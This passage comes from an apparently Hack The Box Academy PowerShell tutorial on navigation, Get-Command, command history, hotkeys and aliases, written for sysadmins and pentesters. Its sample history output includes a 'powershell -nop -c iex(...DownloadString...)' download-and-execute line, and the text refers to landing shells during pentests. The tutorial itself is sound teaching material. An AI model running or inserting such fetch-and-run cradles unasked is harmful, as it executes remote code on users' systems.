<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>                 <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span> <span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>        <span class="hljs-comment">10/26/2021</span>  <span class="hljs-comment">10:26</span> <span class="hljs-comment">PM</span>                <span class="hljs-string">.</span><span class="hljs-comment">ssh</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">1/28/2021</span>   <span class="hljs-comment">7:05</span> <span class="hljs-comment">PM</span>                <span class="hljs-string">.</span><span class="hljs-comment">vscode</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">1/27/2021</span>   <span class="hljs-comment">2:44</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">3D</span> <span class="hljs-comment">Objects</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">1/27/2021</span>   <span class="hljs-comment">2:44</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Contacts</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">9/18/2022</span>  <span class="hljs-comment">12:35</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Desktop</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">9/18/2022</span>   <span class="hljs-comment">1:01</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Documents</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">9/26/2022</span>  <span class="hljs-comment">12:27</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Downloads</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">1/27/2021</span>   <span class="hljs-comment">2:44</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Favorites</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">1/27/2021</span>   <span class="hljs-comment">2:44</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Music</span>
<span class="hljs-comment">dar</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-comment">l</span>         <span class="hljs-comment">9/26/2022</span>  <span class="hljs-comment">12:03</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">OneDrive</span>
<span class="hljs-comment">d</span><span class="hljs-literal">-</span><span class="hljs-comment">r</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>         <span class="hljs-comment">5/22/2022</span>   <span class="hljs-comment">2:00</span> <span class="hljs-comment">PM</span>                <span class="hljs-comment">Pictures</span>
</code></pre>
<p>We can see several other directories within our current working directory. Let&#39;s explore one.</p>
<h4 id="move-to-a-new-directory">Move to a New Directory</h4>
<p>Changing our location is simple; we can do so utilizing the <code>Set-Location</code> cmdlet.</p>
<p><strong>Set-Location</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt;  Set-Location .\Documents\

PS C:\Users\tru7h\Documents&gt; Get-Location

<span class="hljs-section">Path
----</span>
C:\Users\DLarusso\Documents
</code></pre>
<p>We fed the parameters <code>.\Documents\</code> to the Set-Location cmdlet, telling PowerShell that we want to move into the Documents directory, which resides within our current working directory. We could have also given it the full file path like this:</p>
<p>Code: powershell</p>
<pre><code class="lang-powershell">Set-<span class="hljs-keyword">Location</span> <span class="hljs-title">C</span>:\Users\DLarusso\Documents
</code></pre>
<h4 id="display-contents-of-a-file">Display Contents of a File</h4>
<p>Now, if we wish to see the contents of a file, we can use <code>Get-Content</code>. Looking in the Documents directory, we notice a file called <code>Readme.md</code>. Let us check it out.</p>
<p><strong>Get-Content</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Content Readme.md  

<span class="hljs-comment"># ![logo][] PowerShell</span>

Welcome <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> PowerShell GitHub Community!
PowerShell Core is <span class="hljs-keyword">a</span> cross-<span class="hljs-built_in">platform</span> (Windows, Linux, <span class="hljs-keyword">and</span> macOS) automation <span class="hljs-keyword">and</span> configuration tool/framework that works well <span class="hljs-keyword">with</span> your existing tools <span class="hljs-keyword">and</span> is optimized
<span class="hljs-keyword">for</span> dealing <span class="hljs-keyword">with</span> structured data (e.g., JSON, CSV, XML, etc.), REST APIs, <span class="hljs-keyword">and</span> object models.
It includes <span class="hljs-keyword">a</span> <span class="hljs-keyword">command</span>-line <span class="hljs-title">shell</span>, <span class="hljs-title">an</span> <span class="hljs-title">associated</span> <span class="hljs-title">scripting</span> <span class="hljs-title">language</span> <span class="hljs-title">and</span> <span class="hljs-title">a</span> <span class="hljs-title">framework</span> <span class="hljs-title">for</span> <span class="hljs-title">processing</span> <span class="hljs-title">cmdlets</span>. 

&lt;SNIP&gt;
</code></pre>
<p>It looks like the Readme file was from the PowerShell GitHub page. Utilizing the <code>Get-Content</code> cmdlet is as simple as that. Navigating within the PowerShell CLI is pretty straightforward. Now that we have that skill down, let us look at a few helpful tips and tricks that can make utilizing the CLI even smoother.</p>
<h3 id="tips-tricks-for-powershell-usage">Tips &amp; Tricks for PowerShell Usage</h3>
<h4 id="get-command">Get-Command</h4>
<p><code>Get-Command</code> is a great way to find a pesky command that might be slipping from our memory right when we need to use it. With PowerShell using the <code>verb-noun</code> convention for cmdlets, we can search on either.</p>
<p><strong>Get-Command Usage</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Get-Command</span>

<span class="hljs-selector-tag">CommandType</span>     <span class="hljs-selector-tag">Name</span>                                               <span class="hljs-selector-tag">Version</span>    <span class="hljs-selector-tag">Source</span>
<span class="hljs-selector-tag">-----------</span>     <span class="hljs-selector-tag">----</span>                                               <span class="hljs-selector-tag">-------</span>    <span class="hljs-selector-tag">------</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-AppPackage</span>                                     2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Appx</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-AppPackageVolume</span>                               2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Appx</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-AppProvisionedPackage</span>                          3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Dism</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-ProvisionedAppPackage</span>                          3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Dism</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-ProvisionedAppxPackage</span>                         3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Dism</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-ProvisioningPackage</span>                            3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Provisioning</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Add-TrustedProvisioningCertificate</span>                 3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Provisioning</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Apply-WindowsUnattend</span>                              3<span class="hljs-selector-class">.0</span>        <span class="hljs-selector-tag">Dism</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Disable-PhysicalDiskIndication</span>                     2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Storage</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Disable-StorageDiagnosticLog</span>                       2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Storage</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Dismount-AppPackageVolume</span>                          2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Appx</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Enable-PhysicalDiskIndication</span>                      2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Storage</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Enable-StorageDiagnosticLog</span>                        2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Storage</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Flush-Volume</span>                                       2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Storage</span>
<span class="hljs-selector-tag">Alias</span>           <span class="hljs-selector-tag">Get-AppPackage</span>                                     2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Appx</span>

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
</code></pre>
<p>The output above was snipped for the sake of saving screen space. Using <code>Get-Command</code> without additional modifiers will perform a complete output of each cmdlet currently loaded into the PowerShell session. We can trim this down more by filtering on the <code>verb</code> or the <code>noun</code> portion of the cmdlet.</p>
<p><strong>Get-Command (verb)</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-selector-tag">PS</span> <span class="hljs-selector-tag">C</span>:\<span class="hljs-selector-tag">htb</span>&gt; <span class="hljs-selector-tag">Get-Command</span> <span class="hljs-selector-tag">-verb</span> <span class="hljs-selector-tag">get</span>

&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
<span class="hljs-selector-tag">Cmdlet</span>          <span class="hljs-selector-tag">Get-Acl</span>                                            3<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Microsoft</span><span class="hljs-selector-class">.Pow</span>...
<span class="hljs-selector-tag">Cmdlet</span>          <span class="hljs-selector-tag">Get-Alias</span>                                          3<span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">Microsoft</span><span class="hljs-selector-class">.Pow</span>...
<span class="hljs-selector-tag">Cmdlet</span>          <span class="hljs-selector-tag">Get-AppLockerFileInformation</span>                       2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">AppLocker</span>
<span class="hljs-selector-tag">Cmdlet</span>          <span class="hljs-selector-tag">Get-AppLockerPolicy</span>                                2<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">AppLocker</span>
<span class="hljs-selector-tag">Cmdlet</span>          <span class="hljs-selector-tag">Get-AppvClientApplication</span>                          1<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span>    <span class="hljs-selector-tag">AppvClient</span>  
&lt;<span class="hljs-selector-tag">SNIP</span>&gt;
</code></pre>
<p>Using the <code>-verb</code> modifier and looking for any cmdlet, alias, or function with the term get in the name, we are provided with a detailed list of everything PowerShell is currently aware of. We can also perform the exact search using the filter <code>get*</code> instead of the <code>-verb</code> <code>get</code>. The Get-Command cmdlet recognizes the <code>*</code> as a wildcard and shows each variant of <code>get</code>(anything). We can do something similar by searching on the noun as well.</p>
<p><strong>Get-Command (noun)</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\htb&gt; Get-Command -noun windows*  

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Alias           Apply-WindowsUnattend                              <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Function        Get-WindowsUpdateLog                               <span class="hljs-number">1</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>    WindowsUpdate
Cmdlet          <span class="hljs-keyword">Add-WindowsCapability </span>                             <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          <span class="hljs-keyword">Add-WindowsDriver </span>                                 <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          <span class="hljs-keyword">Add-WindowsImage </span>                                  <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          <span class="hljs-keyword">Add-WindowsPackage </span>                                <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          Clear-WindowsCorruptMountPoint                     <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          <span class="hljs-keyword">Disable-WindowsErrorReporting </span>                     <span class="hljs-number">1</span>.<span class="hljs-number">0</span>        WindowsErrorR...
Cmdlet          <span class="hljs-keyword">Disable-WindowsOptionalFeature </span>                    <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          <span class="hljs-keyword">Dismount-WindowsImage </span>                             <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism
</span>Cmdlet          Enable-WindowsErrorReporting                       <span class="hljs-number">1</span>.<span class="hljs-number">0</span>        WindowsErrorR...
Cmdlet          Enable-WindowsOptionalFeature                      <span class="hljs-number">3</span>.<span class="hljs-number">0</span>        <span class="hljs-keyword">Dism</span>
</code></pre>
<p>In the above output, we utilized the <code>-noun</code> modifier, took the filter a step further, and looked for any portion of the noun that contained <code>windows*</code>, so our results came up pretty specific. <code>Anything</code> that begins with windows in the noun portion and is followed by anything else would <code>match</code> this filter. These were just a few demonstrations of how powerful the <code>Get-Command</code> cmdlet can be. Paired with the <code>Get-Help</code> cmdlet, these can be powerful help functions provided to us directly by PowerShell. Our next tip dives into our PowerShell session History.</p>
<h4 id="history">History</h4>
<p>PowerShell keeps a history of the commands run in two different ways. The first is the built-in session history which is implemented and deleted at the start and end of each console session. The other is through the <code>PSReadLine</code> module. The <code>PSReadLine</code> module tracks the history of any PowerShell commands used in all sessions across the host, among many other features. By default, PowerShell keeps the last 4096 commands entered, but this setting can be modified by changing the <code>$MaximumHistoryCount</code> variable.</p>
<p><strong>Get-History</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-string">Get-History
</span>
 <span class="hljs-string">Id </span><span class="hljs-string">CommandLine
</span>  -- -----------
   1 <span class="hljs-string">Get-Command
</span>   2 <span class="hljs-string">clear
</span>   3 <span class="hljs-built_in">get-command</span> -<span class="hljs-string">verb </span><span class="hljs-string">set
</span>   4 <span class="hljs-built_in">get-command</span> <span class="hljs-string">set*</span>
   5 <span class="hljs-string">clear
</span>   6 <span class="hljs-built_in">get-command</span> -<span class="hljs-string">verb </span><span class="hljs-string">get
</span>   7 <span class="hljs-built_in">get-command</span> -<span class="hljs-string">noun </span><span class="hljs-string">windows
</span>   8 <span class="hljs-built_in">get-command</span> -<span class="hljs-string">noun </span><span class="hljs-string">windows*</span>
   9 <span class="hljs-built_in">get-module</span>
  <span class="hljs-string">10 </span><span class="hljs-string">clear
</span>  <span class="hljs-string">11 </span><span class="hljs-built_in">get-history</span>
  <span class="hljs-string">12 </span><span class="hljs-string">clear
</span>  <span class="hljs-string">13 </span><span class="hljs-string">ipconfig </span>/<span class="hljs-string">all
</span>  <span class="hljs-string">14 </span><span class="hljs-string">arp </span>-a
  <span class="hljs-string">15 </span><span class="hljs-built_in">get-help</span>
  <span class="hljs-string">16 </span><span class="hljs-built_in">get-help</span> <span class="hljs-built_in">get-module</span>
</code></pre>
<p>By default, <code>Get-History</code> will only show the commands that have been run during this active session. Notice how the commands are numbered; we can recall those commands by using the alias <code>r</code> followed by the number to run that command again. For example, if we wanted to rerun the <code>arp -a</code> command, we could issue <code>r 14</code>, and PowerShell will action it. Keep in mind that if we close the shell window, or in the instance of a remote shell through command and control, once we kill that session or process that we are running, our PowerShell history will disappear. With <code>PSReadLine</code>, however, that is not the case. <code>PSReadLine</code> stores everything in a file called <code>$($host.Name)_history.txt</code> located at <code>$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine</code>.</p>
<p><strong>Viewing PSReadLine History</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session"><span class="hljs-string">PS </span>C:\<span class="hljs-string">htb&gt;</span> <span class="hljs-built_in">get-content</span> C:\<span class="hljs-string">Users\</span><span class="hljs-string">DLarusso\</span><span class="hljs-string">AppData\</span><span class="hljs-string">Roaming\</span><span class="hljs-string">Microsoft\</span><span class="hljs-string">Windows\</span><span class="hljs-string">PowerShell\</span><span class="hljs-string">PSReadLine\</span><span class="hljs-string">ConsoleHost_history.</span><span class="hljs-string">txt
</span>
<span class="hljs-built_in">get-module</span>
<span class="hljs-string">Get-ChildItem </span><span class="hljs-string">Env:</span> | <span class="hljs-string">ft </span><span class="hljs-string">Key,</span><span class="hljs-string">Value
</span><span class="hljs-string">Get-ExecutionPolicy
</span><span class="hljs-string">clear
</span><span class="hljs-string">ssh </span><span class="hljs-string">administrator@</span><span class="hljs-string">10.</span><span class="hljs-string">172.</span><span class="hljs-string">16.</span><span class="hljs-string">110.</span><span class="hljs-string">55
</span><span class="hljs-string">powershell </span>-<span class="hljs-string">nop </span>-c <span class="hljs-string">"iex(New-Object Net.WebClient).DownloadString('https://download.sysinternals.com/files/PSTools.zip')"</span>
<span class="hljs-string">Get-ExecutionPolicy
</span>
&lt;<span class="hljs-string">SNIP&gt;</span>
</code></pre>
<p>If we ran the above command and were a frequent user of the CLI, we would have an extensive history file to sort through. The output above was snipped to save time and screen space. One great feature of <code>PSReadline</code> from an admin perspective is that it will automatically attempt to filter any entries that include the strings:</p>
<ul>
<li><code>password</code></li>
<li><code>asplaintext</code></li>
<li><code>token</code></li>
<li><code>apikey</code></li>
<li><code>secret</code></li>
</ul>
<p>This behavior is excellent for us as admins since it will help clear any entries from the <code>PSReadLine</code> history file that contain keys, credentials, or other sensitive information. The built-in session history does not do this.</p>
<h4 id="clear-screen">Clear Screen</h4>
<p>This tip is one of convenience. If it bothers us to have a ton of output on our screen all the time, we can remove the text from our console window by using the command <code>Clear-Host</code>. It will only affect our current display and will not get rid of any variables or other objects we may have set or made during the session. We can also use <code>clear</code> or <code>cls</code> if we prefer using short commands or aliases.</p>
<h4 id="hotkeys">Hotkeys</h4>
<p>Unless we are working in the CLI from a GUI environment, our mouse will <code>not</code> often work. For example, let&#39;s say we landed a <code>shell</code> on a host during a pentest. We will have access to CMD or PowerShell from this shell, but we will not be able to utilize the <code>GUI</code>. So we need to be comfortable using just a keyboard. <code>Hotkeys</code> can enable us to perform more complex actions that typically require a mouse with just our keys. Below is a quick list of some of the more useful hotkeys.</p>
<p><strong>Hotkeys</strong></p>
<table>
<thead>
<tr>
<th><strong>HotKey</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>CTRL+R</code></td>
<td>It makes for a searchable history. We can start typing after, and it will show us results that match previous commands.</td>
</tr>
<tr>
<td><code>CTRL+L</code></td>
<td>Quick screen clear.</td>
</tr>
<tr>
<td><code>CTRL+ALT+Shift+?</code></td>
<td>This will print the entire list of keyboard shortcuts PowerShell will recognize.</td>
</tr>
<tr>
<td><code>Escape</code></td>
<td>When typing into the CLI, if you wish to clear the entire line, instead of holding backspace, you can just hit <code>escape</code>, which will erase the line.</td>
</tr>
<tr>
<td><code>↑</code></td>
<td>Scroll up through our previous history.</td>
</tr>
<tr>
<td><code>↓</code></td>
<td>Scroll down through our previous history.</td>
</tr>
<tr>
<td><code>F7</code></td>
<td>Brings up a TUI with a scrollable interactive history from our session.</td>
</tr>
</tbody>
</table>
<p>This list is not all of the functionality we can use in PowerShell but those we find ourselves using the most.</p>
<h4 id="tab-completion">Tab Completion</h4>
<p>One of PowerShell&#39;s best functionalities must be tab completion of commands. We can use <code>tab</code> and <code>SHIFT+tab</code> to move through options that can complete the command we are typing.</p>
<p><strong>Autocomplete Example</strong></p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/tab.gif" alt="text"></p>
<h4 id="aliases">Aliases</h4>
<p>Our last tip to mention is <code>Aliases</code>. A PowerShell alias is another name for a cmdlet, command, or executable file. We can see a list of default aliases using the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/get-alias?view=powershell-7.2">Get-Alias</a> cmdlet. Most built-in aliases are shortened versions of the cmdlet, making it easier to remember and quick to use.</p>
<p><strong>Using Get-Alias</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS C:\Windows\system32&gt; Get-Alias

CommandType     Name                                               Version    Source

-----------     ----                                               -------    -----
A<span class="hljs-function"><span class="hljs-title">lias</span>           % -&gt;</span> ForEach-Object
A<span class="hljs-function"><span class="hljs-title">lias</span>           ? -&gt;</span> Where-Object
A<span class="hljs-function"><span class="hljs-title">lias</span>           ac -&gt;</span> Add-Content
A<span class="hljs-function"><span class="hljs-title">lias</span>           asnp -&gt;</span> Add-PSSnapin
A<span class="hljs-function"><span class="hljs-title">lias</span>           cat -&gt;</span> Get-Content
A<span class="hljs-function"><span class="hljs-title">lias</span>           cd -&gt;</span> Set-Location
A<span class="hljs-function"><span class="hljs-title">lias</span>           CFS -&gt;</span> ConvertFrom-String                          <span class="hljs-number">3.1</span>.<span class="hljs-number">0.0</span>    Mi...
A<span class="hljs-function"><span class="hljs-title">lias</span>           chdir -&gt;</span> Set-Location
A<span class="hljs-function"><span class="hljs-title">lias</span>           clc -&gt;</span> Clear-Content
A<span class="hljs-function"><span class="hljs-title">lias</span>           clear -&gt;</span> Clear-Host
A<span class="hljs-function"><span class="hljs-title">lias</span>           clhy -&gt;</span> Clear-History
A<span class="hljs-function"><span class="hljs-title">lias</span>           cli -&gt;</span> Clear-Item
A<span class="hljs-function"><span class="hljs-title">lias</span>           clp -&gt;</span> Clear-ItemProperty
A<span class="hljs-function"><span class="hljs-title">lias</span>           cls -&gt;</span> Clear-Host
A<span class="hljs-function"><span class="hljs-title">lias</span>           clv -&gt;</span> Clear-Variable
A<span class="hljs-function"><span class="hljs-title">lias</span>           cnsn -&gt;</span> Connect-PSSession
A<span class="hljs-function"><span class="hljs-title">lias</span>           compare -&gt;</span> Compare-Object
A<span class="hljs-function"><span class="hljs-title">lias</span>           copy -&gt;</span> Copy-Item
A<span class="hljs-function"><span class="hljs-title">lias</span>           cp -&gt;</span> Copy-Item
A<span class="hljs-function"><span class="hljs-title">lias</span>           cpi -&gt;</span> Copy-Item
A<span class="hljs-function"><span class="hljs-title">lias</span>           cpp -&gt;</span> Copy-ItemProperty
A<span class="hljs-function"><span class="hljs-title">lias</span>           curl -&gt;</span> Invoke-WebRequest
A<span class="hljs-function"><span class="hljs-title">lias</span>           cvpa -&gt;</span> Convert-Path
A<span class="hljs-function"><span class="hljs-title">lias</span>           dbp -&gt;</span> Disable-PSBreakpoint
A<span class="hljs-function"><span class="hljs-title">lias</span>           del -&gt;</span> Remove-Item
A<span class="hljs-function"><span class="hljs-title">lias</span>           diff -&gt;</span> Compare-Object
A<span class="hljs-function"><span class="hljs-title">lias</span>           dir -&gt;</span> Get-ChildItem

&lt;SNIP&gt;
</code></pre>
<p>It is an excellent practice to make aliases shorter than the name of the actual cmdlet, command, or executable. Even the <code>Get-Alias</code> cmdlet has a default alias of <code>gal</code>, as seen in the clip below.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/GalAlias.gif" alt="Gal Alias"></p>
<p>We can also set an alias for a specific cmdlet using <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-7.2">Set-Alias</a>. Let us practice with this by making an alias for the <code>Get-Help</code> cmdlet.</p>
<p><strong>Using Set-Alias</strong></p>
<p>CMD Vs. PowerShell</p>
<pre><code class="lang-powershell-session">PS <span class="hljs-keyword">C</span>:\Windows\system32&gt; <span class="hljs-keyword">Set</span>-Alias -Name gh -<span class="hljs-keyword">Value</span> <span class="hljs-keyword">Get</span>-Help
</code></pre>
<p>When using <code>Set-Alias</code>, we need to specify the name of the alias (<code>-Name gh</code>) and the corresponding cmdlet (<code>-Value Get-Help</code>).</p>
<p><img src="https://academy.hackthebox.com/storage/modules/167/SetAlias.gif" alt="Set Alias"></p>
<p>Below we also include a list of several aliases we find to be most helpful. Some commands have more than one alias as well. Be sure to look at the complete list for other aliases you may find helpful.</p>
<p><strong>Helpful Aliases</strong></p>
<table data-header-hidden><thead><tr><th width="184"></th><th></th></tr></thead><tbody><tr><td><strong>Alias</strong></td><td><strong>Description</strong></td></tr><tr><td><code>pwd</code></td><td>gl can also be used. This alias can be used in place of Get-Location.</td></tr><tr><td><code>ls</code></td><td>dir and gci can also be used in place of ls. This is an alias for Get-ChildItem.</td></tr><tr><td><code>cd</code></td><td>sl and chdir can be used in place of cd. This is an alias for Set-Location.</td></tr><tr><td><code>cat</code></td><td>type and gc can also be used. This is an alias for Get-Content.</td></tr><tr><td><code>clear</code></td><td>Can be used in place of Clear-Host.</td></tr><tr><td><code>curl</code></td><td>Curl is an alias for Invoke-WebRequest, which can be used to download files. wget can also be used.</td></tr><tr><td><code>fl and ft</code></td><td>These aliases can be used to format output into list and table outputs.</td></tr><tr><td><code>man</code></td><td>Can be used in place of help.</td></tr></tbody></table>

<p>For those familiar with <code>BASH</code>, you may have noticed that many of the aliases match up to commands widely used within Linux distributions. This knowledge can be helpful and help ease the learning curve.</p>
<hr>
<p>This section has been a bit long, and for a good reason. We covered all the essentials to move us along our path to PowerShell mastery. From here, we will dive deep into PowerShell modules and cmdlets.</p>
<h2 id="all-about-cmdlets-and-modules">All About Cmdlets and Modules</h2>
<hr>
<p>In this section, we will cover the following:</p>
<ul>
<li>What are cmdlets and Modules?</li>
<li>How do we interact with them?</li>
<li>How do we install and load new modules from the web?</li>
</ul>
<p>Understanding these questions is crucial when utilizing PowerShell as both a sysadmin and pentester. PowerShells&#39; ability to be modular and expandable makes it a powerhouse tool to have in our kit. Let us dive into what cmdlets and modules are.</p>
<hr>
<h3 id="cmdlets">Cmdlets</h3>
<p>A <a href="https://docs.microsoft.com/en-us/powershell/scripting/lang-spec/chapter-13?view=powershell-7.2">cmdlet</a> as defined by Microsoft is:</p>
<p>&quot;<code>a single-feature command that manipulates objects in PowerShell.</code>&quot;</p>
<p>Cmdlets follow a Verb-Noun structure which often makes it easier for us to understand what any given cmdlet does. With Test-WSMan, we can see the <code>verb</code> is <code>Test</code> and the <code>Noun</code> is <code>Wsman</code>. The verb and noun are separated by a dash (<code>-</code>). After the verb and noun, we would use the options available to us with a given cmdlet to perform the desired action. Cmdlets are similar to functions used in PowerShell code or other programming languages but have one significant difference. Cmdlets are <code>not</code> written in PowerShell. They are written in C# or another language and then compiled for use. As we saw in the last section, we can use the <code>Get-Command</code> cmdlet to view the available applications, cmdlets, and functions, along with a trait labeled &quot;CommandType&quot; that can help us identify its type.</p>
<p>If we want to see the options and functionality available to us with a specific cmdlet, we can use the <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/get-help?view=powershell-7.2">Get-Help</a> cmdlet as well as the <code>Get-Member</code> cmdlet.</p>
<hr>
<h3 id="powershell-modules">PowerShell Modules</h3>
